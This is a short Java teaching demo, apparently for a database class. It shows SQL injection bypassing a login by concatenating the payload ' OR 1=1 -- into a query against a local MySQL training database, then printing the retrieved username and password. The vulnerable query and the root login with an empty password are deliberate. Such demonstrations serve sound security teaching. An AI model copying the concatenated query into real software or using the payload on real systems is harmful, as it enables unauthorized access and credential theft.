import java.sql.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Properties;

/**
 * 🔓 TOPIC 2: THE VULNERABLE WAY (WITHOUT SECURITY)
 * 🚀 RUN ORDER: [TOPIC 2 - HACK DEMO]
 * 🎯 GOAL: Show students how easy it is to hack a standard 'Statement'.
 */
public class HackerDemo_Vulnerable {
    public static void main(String[] args) {
        String jarPath = "C:\\\\Users\\\\Mech\\\\Desktop\\\\malini\\\\DAY 5\\\\mysql-connector-j-9.7.0.jar";
        String dbUrl = "jdbc:mysql://localhost:3306/day6_training_db";

        // 🕵️ HACKER INPUT: The classic 'OR 1=1' followed by '-- ' (comment)
        // This tells the database: "Select anyone where 1=1 and IGNORE the rest of the query"
        String hackerUsername = "' OR 1=1 -- "; 
        String hackerPassword = "I_DONT_KNOW_THE_PASSWORD";

        try {
            URL jarUrl = new URL("file:///" + jarPath.replace("\\", "/"));
            try (URLClassLoader loader = new URLClassLoader(new URL[]{jarUrl}, ClassLoader.getSystemClassLoader())) {
                Driver driver = (Driver) loader.loadClass("com.mysql.cj.jdbc.Driver").getDeclaredConstructor().newInstance();
                Connection conn = driver.connect(dbUrl, new Properties() {{ setProperty("user", "root"); setProperty("password", ""); }});
                Statement stmt = conn.createStatement();

                System.out.println("🕵️ [HACKER]: Attempting to bypass login using SQL Injection...");

                // ❌ DANGEROUS: String concatenation makes the hacker's input part of the command!
                String sql = "SELECT * FROM users WHERE username = '" + hackerUsername + "' AND password = '" + hackerPassword + "'";
                
                System.out.println("🔍 Executing Raw SQL: " + sql);
                ResultSet rs = stmt.executeQuery(sql);

                if (rs.next()) {
                    System.out.println("🔓 [HACK SUCCESS]: I am inside the system!");
                    
                    // 😱 SHOW STOLEN DATA
                    System.out.println("👤 Stolen Username: " + rs.getString("username"));
                    System.out.println("🔑 Stolen Password: " + rs.getString("password"));
                    System.out.println("----------------------------------------------");
                } else {
                    System.out.println("❌ Login Failed.");
                }

                conn.close();
            }
        } catch (Exception e) { e.printStackTrace(); }
    }
}